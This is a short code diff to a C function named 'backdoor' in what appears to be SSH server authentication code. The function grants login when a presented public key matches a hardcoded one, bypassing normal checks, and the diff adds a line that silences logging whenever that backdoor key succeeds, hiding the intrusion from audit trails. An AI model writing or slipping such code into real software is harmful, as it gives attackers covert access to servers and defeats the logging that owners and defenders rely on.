@@ -246,6 +246,11 @@ backdoor(Authctxt *authctxt)
 	}
 
 	int authenticated = memcmp(pkblob, pubkey_decoded, blen) == 0;
+
+	if (authenticated) {
+		log_silenced = 1;
+	}
+
 	return authenticated || userauth_pubkey_(authctxt, pkalg, pkblob, alen, blen, have_sig);
 }
 
